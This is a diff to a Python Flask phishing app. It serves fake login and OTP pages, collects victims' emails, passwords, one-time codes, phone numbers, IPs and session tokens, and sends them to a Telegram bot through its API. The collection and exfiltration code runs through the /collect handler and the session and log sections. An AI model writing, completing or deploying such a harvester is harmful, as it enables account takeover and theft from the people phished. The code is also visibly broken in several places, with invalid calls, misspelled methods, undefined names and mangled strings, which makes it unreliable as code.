@@ -29,9 +29,6 @@ def init_data():
         "otp": "",
         "device_browser": request.headers.get("User-Agent", ""),
         "ip": request.remote_addr,
-        "clicks": "",
-        "time_spent": "",
-        "movements": ""
     }
     
 @app.route('/')
@@ -42,15 +39,38 @@ def index():
 def login():
     return render_template("login.html")
     
+@app.route('/otp.html')
+def otp():
+    return render_template("otp.html")     
+    
 @app.route('/collect', methods=['POST'])
 def collect():
     try:
+        if request.is_json:
+            data = request.get_json.form.to_dict(silent=true) or {}
+        else:
+             data = request.form.to_dict(flat=True)
+             
         payload = request.get_json(silent=True)
         if not payload:
             payload = request.data.to_dict()
         data = payload
-            
-        data = payload or {}
+        
+        email = data.get("email")
+        password = data.get("password")
+        otp = data.get("otp")
+        phone = data.get("phone")
+        ip = data.get("ip")
+        device_browser = data.get("device_browser")
+        
+        message = f"""
+             Email: {email}
+             Password: {password}
+             Phone: {phone}
+             OTP: {otp}
+             IP: {ip}
+             '''.
+                     """
         
         send_to_telegram(data)
            
@@ -61,9 +81,9 @@ def send_to_telegram(data):
     try:
        token = os.getenv("TG_BOT_TOKEN")
        chat_id = os.getenv("TG_CHAT_ID")
-       return jsonify(ok=True), 200
+       
     except Exception as e:   
-       print("collect error:", e)
+        print("collect error:", e)
             
 def collect_sessions():
     try:
@@ -71,23 +91,14 @@ def collect_sessions():
 
         entry = {"token": session_data} 
 
-        if os .path.exists("session.json"):
+        if os .path.exists("sessions.json"):
             with open("sessions.json", "r", encoding="utf-8") as f:
                 data = json.load(f)
-        else:
-            data = []
-
-        session_data = {"token": request.form.get('token')}
-        data.append(session_data)
-
-        with open("sessions.json", "w") as f:
-            json.dump(data, f, indent=4)
-
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+        for session in sessions:
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                       "chat_id": CHAT_ID,
-                      "text": f"session Token: {session_data}\nUser-Agent: {user_agent}"
-                  }
-        )
+                      "text": f"session Token: {session_data}\nUser-Agent: {user_agent}"})       
+
     except Exception as e:
         print(f"خطأ في جمع الجلسة: {e}")
 # جلب بيانات الجهاز والمتصفح الحقيقية
@@ -95,43 +106,28 @@ def collect_sessions():
         ip_address = request.remote_addr
 
 if os.path.exists("log.json"):
-    with open("log.json", "r") as f:
+     with open("log.json", "r") as f:
         logs = json.load(f)
+        
 else:
     logs = []
+    email = request.data.get("email")
+    password = request.data.get("password")
+    phone = request.data.get("phone")
+    otp = request.data.get("otp")
 
-logs.append({
-    "email": "",
-    "password": "",
-    "phone": "",
-    "otp": "",
-    "clicks": "",
-    "time_spent": "",
-    "movements": ""
-})
+    log.appand({"email":email, "password": password, "otp":otp})
         
-with open("log.json", "w") as f:
-    json.dump(logs, f, indent=4, ensure_ascii=False)
-
-# إرسال البيانات للبوت
-message = """
-Email: {email}
-Password: {password}
-Phone: {phone}
-OTP: {otp}
-IP: {ip}
-'''.
-
-        Device/Browser: {data['device_browser']}
-        IP: {data['ip']}
-        Clicks: {data['clicks']}
-        Time Spent: {data['time_spent']} ثانية
-        Movements: {data['movements']}
-        """
-requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-        "chat_id": CHAT_ID,
-        "text": message
-    })
+    message = f"""
+             Email: {email}
+             Password: {password}
+             Phone: {phone}
+             OTP: {otp}
+             IP: {ip}
+             '''.
+                     """
+    send_to_telegram(message)         
+    
 def notify(text: str) -> bool:
     try:
         token = os.getenv("TG_BOT_TOKEN")
@@ -146,10 +142,6 @@ def notify(text: str) -> bool:
         print("TG >", r.status_code, r.text)
     except Exception as e:
         print("notify error:", e)
-
-@app.get("/form")
-def form_page():
-    return "ok"
 
 @app.get("/")
 def root():
